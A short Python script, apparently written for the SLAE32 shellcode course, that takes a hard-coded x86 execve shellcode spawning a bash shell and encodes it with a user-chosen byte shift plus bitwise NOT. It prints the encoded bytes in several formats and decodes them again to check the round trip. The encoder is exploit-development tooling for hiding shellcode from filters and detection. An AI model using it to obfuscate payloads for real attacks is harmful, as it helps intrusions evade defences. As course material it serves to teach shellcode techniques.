#!/usr/bin/python
import sys

# ROT X + NOT encoder / decoder
# For SLAE32
# Howard McGreehan

if len(sys.argv) < 2:
    print("[!] Provide a shift")
    sys.exit()
else:
    shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Set up a few variables for use in our loop
orig = ""
encoded = bytearray()
encodedOut1 = ""
encodedOut2 = ""
encodedOut3 = ""
encoded2 = ""

# We can't let the bytes become bigger than 256 minus the value we add!
addVal = int(sys.argv[1])
maxVal = 256 - addVal

# Create a loop to encode our shellcode
for byte in bytearray(shellcode):   

    # For sanity, we'll print out the original shellcode
    orig += '\\x%02x' % (byte & 0xff)

    # Check how big the byte is, if it's going to be larger than the 
    # maxVal, we need to account for it (otherwise it's bigger than a byte)
    if (byte < maxVal):
        tmp = (~(byte + addVal))&0xff
        encodedOut1 += '\\x%02x' % (tmp)
        encodedOut2 += '%02x' % (tmp)
        encodedOut3 += '0x%02x,' % (tmp)
        encoded.append(tmp)
    else:
        tmp = (~(addVal - maxVal + byte))&0xff
        encodedOut1 += '\\x%02x' % (tmp)
        encodedOut2 += '%02x' % (tmp)
        encodedOut3 += '0x%02x,' % (tmp)
        encoded.append(tmp)

# Simple decoder
# Does the inverse of above
for byte in bytearray(encoded):

    if (byte < maxVal):
        tmp = (~byte  - addVal)&0xff
        encoded2 += '\\x%02x' % (tmp)
    else:
        tmp = (addVal + maxVal - ~byte)&0xff
        encoded2 += '\\x%02x' % (tmp)

l1 = len(bytearray(shellcode))

print("Original shellcode (%s bytes): \n%s\n") % (str(l1), orig)
print("Shift %s + NOT Encodings:\n") % (int(addVal))

print("%s\n") % (encodedOut1)
print("0x%s\n") %(encodedOut2)
print("%s\n") % (encodedOut3)
print("Unshift (should be orig): \n%s\n") % (encoded2)

